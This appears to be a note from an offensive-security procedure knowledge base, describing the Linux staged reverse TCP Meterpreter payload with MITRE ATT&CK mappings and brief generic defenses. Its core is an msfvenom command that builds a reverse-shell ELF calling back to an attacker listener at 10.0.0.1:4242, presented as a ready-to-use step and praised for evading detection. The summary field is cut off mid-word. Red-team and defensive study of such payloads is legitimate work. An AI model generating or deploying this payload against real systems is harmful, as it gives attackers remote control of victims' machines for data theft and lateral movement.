---
id: 4acd6633-7a6a-4905-9a61-5cec858ccd73
name: Linux Staged Reverse TCP Meterpreter Shell
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.874382+00:00'
updated_at: '2023-05-26T00:58:17.909161+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Custom Cryptographic Protocol|T1024 - Custom Cryptographic Protocol]]'
- '[[Remote Services|T1021 - Remote Services]]'
tags:
- '[[Linux Staged reverse TCP]]'
- '[[Meterpreter Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
commands:
- '[[Generate Linux reverse meterpreter payload]]'
---

# Linux Staged Reverse TCP Meterpreter Shell

## Summary

The Linux Staged Reverse TCP Meterpreter Shell is a payload that provides a command line interface for an attacker to interact with a compromised Linux system. This payload uses the Meterpreter shell to provide a powerful set of features for remote control of a system. The staged version of the pay

## Description

# Description

The Linux Staged Reverse TCP Meterpreter Shell is a payload that provides a command line interface for an attacker to interact with a compromised Linux system. This payload uses the Meterpreter shell to provide a powerful set of features for remote control of a system. The staged version of the payload allows for a smaller initial payload to be delivered to the target, which can then download and execute the full payload. This can help to evade detection by security software that may be looking for large payloads being delivered over the network.

Technical Explanation: The Linux Staged Reverse TCP Meterpreter Shell is a payload that uses the Meterpreter shell to provide an attacker with a command line interface to interact with a compromised Linux system. The staged version of the payload allows for a smaller initial payload to be delivered to the target, which can then download and execute the full payload. This can help to evade detection by security software that may be looking for large payloads being delivered over the network. The payload uses a custom command and control protocol to communicate with the attacker, which can also help to evade detection.

Business Value: This procedure can be used by an attacker to gain remote access to a compromised Linux system, allowing them to steal sensitive data, install malware, or use the compromised system as a pivot point to attack other systems on the network.

 

## Requirements

1. Access to a vulnerable Linux system

1. Knowledge of the target system's network configuration

 

## Defense

1. Ensure that all Linux systems are patched and up-to-date to prevent vulnerabilities from being exploited

1. Monitor network traffic for suspicious activity

1. Implement strong access controls to prevent unauthorized access to critical systems

 

## Objectives

1. Gain remote access to a compromised Linux system

1. Execute commands on the compromised system

 

# Instructions

1. Use the msfvenom tool to generate a Linux x86 Meterpreter payload that will connect back to the specified IP address and port. The payload will be saved as a ELF file named 'reverse.elf'.

 



**Code**: [[msfvenom -p linux/x86/meterpreter/reverse_tcp LHOS]]



> -p: Specify the payload to use
linux/x86/meterpreter/reverse_tcp: The payload to use - a reverse TCP Meterpreter shell for Linux x86 systems
LHOST: The IP address of the listener
LPORT: The port of the listener
-f: The format in which to output the payload
elf: The ELF format for Linux executables
>reverse.elf: Redirect the output of the payload to a file named 'reverse.elf'



**Command** ([[Generate Linux reverse meterpreter payload]]):

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
```



## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Execution|TA0002 - Execution]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Custom Cryptographic Protocol|T1024 - Custom Cryptographic Protocol]]
- [[Remote Services|T1021 - Remote Services]]

## Commands Used

- [[Generate Linux reverse meterpreter payload]]

## Tags

- [[Linux Staged reverse TCP]]
- [[Meterpreter Shell]]
- [[Reverse Shell Cheat Sheet]]


